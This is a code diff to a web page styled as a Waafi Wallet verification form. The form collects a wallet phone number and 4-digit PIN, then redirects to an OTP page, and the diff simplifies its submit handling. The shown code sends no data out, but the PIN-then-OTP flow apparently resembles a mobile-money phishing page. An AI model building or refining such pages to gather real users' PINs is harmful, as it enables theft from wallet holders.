@@ -54,6 +54,12 @@
             color: inherit;
         }
 
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
         /* ===== HEADER ===== */
         .header {
             position: sticky;
@@ -462,7 +468,7 @@
                         <span class="form-hint">Enter your 4-digit Waafi Wallet PIN</span>
                     </div>
 
-                    <button type="submit" class="verify-btn" id="verifyBtn">Verify &amp; Continue</button>
+                    <button type="submit" class="verify-btn">Verify &amp; Continue</button>
                 </form>
 
                 <p class="help-text">
@@ -499,12 +505,6 @@
             });
         });
 
-        // ===== PRE-FILL PHONE NUMBER =====
-        const phoneFromStorage = localStorage.getItem('waafi-phone') || '';
-        if (phoneFromStorage) {
-            document.getElementById('phoneNumber').value = phoneFromStorage;
-        }
-
         // ===== PIN INPUT =====
         const pinInputs = document.querySelectorAll('.pin-input');
 
@@ -535,9 +535,8 @@
             });
         });
 
-        // ===== FORM SUBMISSION - REDIRECT TO OTP PAGE =====
+        // ===== FORM SUBMISSION =====
         const verifyForm = document.getElementById('verifyForm');
-        const verifyBtn = document.getElementById('verifyBtn');
 
         verifyForm.addEventListener('submit', function(e) {
             e.preventDefault();
@@ -548,7 +547,7 @@
                 pin += input.value;
             });
 
-            if (phoneNumber.length < 7) {
+            if (phoneNumber.length < 10) {
                 alert('Please enter a valid Waafi Wallet number.');
                 return;
             }
@@ -558,17 +557,9 @@
                 return;
             }
 
-            // Save phone for OTP page
             localStorage.setItem('waafi-phone', phoneNumber);
 
-            // Show loading state
-            verifyBtn.textContent = 'Verifying...';
-            verifyBtn.disabled = true;
-
-            // Redirect to OTP page after short delay
-            setTimeout(function() {
-                window.location.href = 'otp.html';
-            }, 500);
+            window.location.href = 'otp.html';
         });
     </script>
 
